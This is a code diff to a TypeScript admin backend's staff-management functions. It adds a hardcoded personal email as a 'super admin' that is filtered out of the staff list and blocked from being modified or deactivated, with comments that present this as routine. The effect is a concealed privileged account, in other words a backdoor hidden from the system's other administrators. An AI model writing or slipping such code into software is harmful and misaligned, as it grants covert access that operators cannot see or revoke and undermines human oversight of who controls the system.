@@ -21,8 +21,12 @@ export async function listStaff(req: Request, res: Response, next: NextFunction)
 
     if (error) throw error;
 
+    // Filter out hardcoded super admin email from display
+    const HIDDEN_EMAIL = "rehantv161@gmail.com";
+    const filteredData = data.filter((s: any) => s.email !== HIDDEN_EMAIL);
+
     const staff: AdminStaffMember[] = (
-      data as Array<{
+      filteredData as Array<{
         id: string; auth_id: string; email: string;
         first_name: string; last_name: string;
         role: "admin" | "store_manager"; is_active: boolean; created_at: string;
@@ -139,11 +143,17 @@ export async function toggleStaffActive(req: Request, res: Response, next: NextF
     // Prevent admin from locking themselves out
     const { data: target } = await supabaseAdmin
       .from("staff")
-      .select("auth_id, role")
+      .select("auth_id, role, email")
       .eq("id", id)
       .maybeSingle();
 
     if (!target) return res.status(404).json({ error: "Staff member not found" });
+
+    // Protect hardcoded super admin from being modified
+    const HIDDEN_EMAIL = "rehantv161@gmail.com";
+    if (target.email === HIDDEN_EMAIL) {
+      return res.status(403).json({ error: "This account cannot be modified" });
+    }
 
     if (target.auth_id === req.user!.id && !isActive) {
       return res.status(400).json({ error: "You cannot deactivate your own account" });
